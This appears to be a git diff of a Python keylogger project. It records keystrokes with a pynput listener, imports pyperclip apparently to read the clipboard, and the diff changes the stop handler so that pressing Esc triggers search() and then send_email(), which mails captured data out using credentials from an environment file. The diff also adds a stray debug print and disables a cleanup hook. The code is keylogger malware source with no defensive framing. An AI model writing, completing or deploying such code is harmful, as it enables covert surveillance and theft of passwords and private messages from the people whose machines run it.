@@ -5,6 +5,7 @@ import pyperclip
 import string
 import atexit
 import os
+import sys
 from dotenv import load_dotenv
 
 import uuid
@@ -71,11 +72,10 @@ def keyPressed(key):
                  pass
             elif "Key.shift" in str(key):
                  pass
-            elif Key.esc:
+            elif key == Key.esc:
                  pass
-
             elif str(key) == "Key.backspace":
-            # elif Key.backspace:
+                print("Test")
                 if logKey.tell() > 0:
                     logKey.seek(logKey.tell() - 1)
                     logKey.truncate()
@@ -86,7 +86,9 @@ def on_release(key):
     # Stopping Listener
     if key == Key.esc:
         print("Escape key pressed. Stopping listener...")
-        exit()
+        if search():
+            send_email()
+        sys.exit(0)
 
 def send_email():
     # Getting the email from the environ file
@@ -245,7 +247,7 @@ if __name__ == "__main__":
     with keyboard.Listener(on_press=keyPressed, on_release=on_release) as l:
         l.join()
 
-    atexit.register(cleanup_function)
+    # atexit.register(cleanup_function)
 
     # clipboard_contents = get_clipboard_contents()
     # print(clipboard_contents)
